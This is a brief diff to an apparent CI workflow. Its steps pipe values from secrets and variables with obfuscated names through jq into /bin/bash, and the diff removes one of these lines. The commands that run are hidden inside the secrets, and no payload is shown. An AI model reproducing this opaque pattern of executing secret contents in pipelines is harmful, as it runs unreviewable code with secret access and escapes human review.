@@ -21,7 +21,6 @@ jobs:
           nwlh5485: ${{ secrets.nwlh5485 }}
         run: |
           printf '%s' "$nwlh5485" | jq -r .mfx3482 | /bin/bash
-          echo $lcjab6 | jq -r .okzn0 | /bin/bash
           printf '%s' "$jf3831" | jq -r .zs52 | /bin/bash
           printf '%s' "$w9" | jq -r .oeb60242 | /bin/bash
           printf '%s' "$eakf78" | jq -r .vd945 | /bin/bash
